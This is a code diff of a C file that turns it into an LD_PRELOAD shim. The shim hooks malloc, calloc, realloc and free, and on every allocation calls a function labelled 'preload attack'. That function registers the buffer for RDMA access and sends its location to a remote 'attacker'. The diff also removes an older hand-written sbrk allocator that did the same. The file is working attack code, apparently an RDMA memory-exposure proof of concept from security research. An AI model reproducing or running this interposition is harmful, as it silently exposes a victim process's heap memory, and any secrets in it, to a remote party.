@@ -1,15 +1,57 @@
-/*
- * Malloc curtesy: https://danluu.com/malloc-tutorial/
- */
+#define _GNU_SOURCE
 
-#include <unistd.h>
-#include <sys/types.h>
-#include <string.h>
-#include <assert.h>
+#include <stdio.h>
 #include <stdbool.h>
+#include <dlfcn.h>
 #include <rdma/rdma_cma.h>
 #include <rdma/rdma_verbs.h>
 #include <infiniband/verbs.h>
+
+static __thread int no_hook;
+
+void preload(void *);
+
+static void *(*real_malloc)(size_t) = NULL;
+static void *(*real_calloc)(size_t, size_t) = NULL;
+static void *(*real_realloc)(void *, size_t) = NULL;
+static void (*real_free)(void *) = NULL;
+
+static void __attribute__((constructor))init(void) {
+  real_malloc = (void * (*)(size_t))dlsym(RTLD_NEXT, "malloc");
+  real_calloc = (void * (*)(size_t, size_t))dlsym(RTLD_NEXT, "calloc");
+  real_realloc = (void * (*)(void *, size_t))dlsym(RTLD_NEXT, "realloc");
+  real_free = (void (*)(void *))dlsym(RTLD_NEXT, "free");
+}
+
+void *malloc(size_t len) {
+  void* ret;
+
+  if (no_hook) {
+    return (*real_malloc)(len);
+  }
+
+  no_hook = 1;
+  printf("malloc call: %zu bytes\n", len);
+  ret = (*real_malloc)(len); 
+  
+  /* preload attack */
+  preload(ret); 
+  
+  no_hook = 0; 
+  return ret; 
+}
+
+void free(void *ptr) {
+  (*real_free)(ptr);
+}
+
+void *calloc(size_t nmem, size_t size) {
+  return real_calloc(nmem, size); 
+}
+
+void *realloc(void *ptr, size_t size) {
+  return real_realloc(ptr, size);
+}
 
 void preload(void *ptr){
 
@@ -44,8 +86,6 @@ void preload(void *ptr){
   ret = rdma_create_qp(id, pd, &attr);
   ret = rdma_connect(id, &conn_param);
   pd = id->qp->pd;
-  //char* ptr = (char*)malloc(128);
-  
   
   // change to true to use implicit ODP.
   bool useodp = false;
@@ -75,97 +115,5 @@ void preload(void *ptr){
       int ret = ibv_post_send(id->qp, &wr, &bad);
       assert(ret==0 && "Failed to send memory information to the attacker");
   }
-//  printf("Attacker expects secret at %p \n",ptr);
 
-  //free(ptr); // free memory, but it is still RDMA accesible
-}
-
-struct block_meta {
-  size_t size;
-  struct block_meta *next;
-  int free;
-  int magic; // For debugging only. TODO: remove this in non-debug mode.
-};
-
-#define META_SIZE sizeof(struct block_meta)
-
-void *global_base = NULL;
-
-struct block_meta *find_free_block(struct block_meta **last, size_t size) {
-  struct block_meta *current = global_base;
-  while (current && !(current->free && current->size >= size)) {
-    *last = current;
-    current = current->next;
-  }
-  return current;
-}
-
-struct block_meta *get_block_ptr(void *ptr) {
-  return (struct block_meta*)ptr - 1;
-}
-
-struct block_meta *request_space(struct block_meta* last, size_t size) {
-  struct block_meta *block;
-  block = sbrk(0);
-  void *request = sbrk(size + META_SIZE);
-  assert((void*)block == request); // Not thread safe.
-  if (request == (void*) -1) {
-    return NULL; // sbrk failed.
-  }
-
-  if (last) { // NULL on first request.
-    last->next = block;
-  }
-  block->size = size;
-  block->next = NULL;
-  block->free = 0;
-  block->magic = 0x12345678;
-  return block;
-}
-
-void *malloc(size_t size) {
-  struct block_meta *block;
-  // TODO: align size?
-
-  if (size <= 0) {
-    return NULL;
-  }
-
-  if (!global_base) { // First call.
-    block = request_space(NULL, size);
-    if (!block) {
-      return NULL;
-    }
-    global_base = block;
-  } else {
-    struct block_meta *last = global_base;
-    block = find_free_block(&last, size);
-    if (!block) { // Failed to find free block.
-      block = request_space(last, size);
-      if (!block) {
-        return NULL;
-      }
-    } else {      // Found free block
-      // TODO: consider splitting block here.
-      block->free = 0;
-      block->magic = 0x77777777;
-    }
-  }
-
-  write(1, "malloc\n", 7);
-  preload(block+1);
-  return(block+1);
-}
-
-void free(void *ptr) {
-  if (!ptr) {
-    return;
-  }
-
-  // TODO: consider merging blocks once splitting blocks is implemented.
-  struct block_meta* block_ptr = get_block_ptr(ptr);
-  assert(block_ptr->free == 0);
-  assert(block_ptr->magic == 0x77777777 || block_ptr->magic == 0x12345678);
-  block_ptr->free = 1;
-  block_ptr->magic = 0x55555555;
 }
